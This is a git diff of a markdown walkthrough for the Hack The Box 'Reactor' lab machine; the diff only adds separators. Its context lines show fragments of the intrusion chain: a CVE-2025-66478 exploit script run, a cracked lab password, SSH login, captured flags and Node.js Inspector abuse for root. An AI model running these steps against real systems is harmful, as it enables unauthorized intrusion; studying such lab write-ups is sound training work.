@@ -14,6 +14,8 @@ A complete walkthrough for the Reactor machine on Hack The Box, demonstrating re
 | OS | Linux |
 | Vulnerabilities | CVE-2025-66478, Node.js Inspector Abuse |
 
+---
+
 ## 🧭 Table of Contents
 
 - [Reconnaissance](#-reconnaissance)
@@ -26,6 +28,8 @@ A complete walkthrough for the Reactor machine on Hack The Box, demonstrating re
 - [Tools Used](#-tools-used)
 - [Legal Disclaimer](#-legal-disclaimer)
 - [Acknowledgments](#-acknowledgments)
+
+---
 
 ## 🔍 Reconnaissance
 
@@ -43,6 +47,7 @@ nmap -sC -sV 10.129.8.62
 The web application running on port 3000 is a Next.js dashboard used for monitoring a nuclear reactor.
 
 ---
+
 ### 🚪 Initial Access — CVE-2025-66478 (React2Shell)
 
 ```bash
@@ -71,6 +76,9 @@ python3 react2shell-ultimate.py \
 ```bash
 uid=999(node) gid=988(node) groups=988(node)
 ```
+
+---
+
 ### 🗄️ Database Enumeration
 
 ```bash
@@ -101,7 +109,9 @@ python3 react2shell-ultimate.py \
 ```bash
 39d97110eafe2a9a68639812cd271e8e
 ```
+
 ---
+
 ### 🔑 Cracking the Hash
 
 ```bash
@@ -113,7 +123,9 @@ The hash was identified as MD5.
 Username: engineer
 Password: reactor1
 ```
+
 ---
+
 ### 🖥️ SSH Access
 ```bash
 ssh engineer@10.129.8.62
@@ -132,7 +144,9 @@ cat /home/engineer/user.txt
 ```bash
 ae03f16d9cc263fb8e30ca26e7f3c03c
 ```
+
 ---
+
 ### 👑 Privilege Escalation — Node.js Inspector
 ```bash
 ps aux | grep node
@@ -173,7 +187,9 @@ wscat -c ws://127.0.0.1:9229/01234567-89ab-cdef-0123-456789abcdef
 ```bash
 264ad8ca69f8db0f53d7e1df5a04a089
 ```
+
 ---
+
 ### 🧵 Attack Chain Summary
 
 ```bash
@@ -197,7 +213,9 @@ Node.js Inspector Abuse
    ↓
 Root Shell / Root Flag Access
 ```
+
 ---
+
 ### 📦 Tools Used
 
 ## 🛠️ Tools Used
@@ -212,6 +230,7 @@ Root Shell / Root Flag Access
 | wscat | Interacting with Node.js Inspector |
 
 ---
+
 ### ⚠️ Legal Disclaimer
 
 This walkthrough is intended strictly for educational purposes and authorized security research.
@@ -220,4 +239,4 @@ This walkthrough is intended strictly for educational purposes and authorized se
 
 ### 🙏 Acknowledgments
 
-Hack The Box
+• Hack The Box
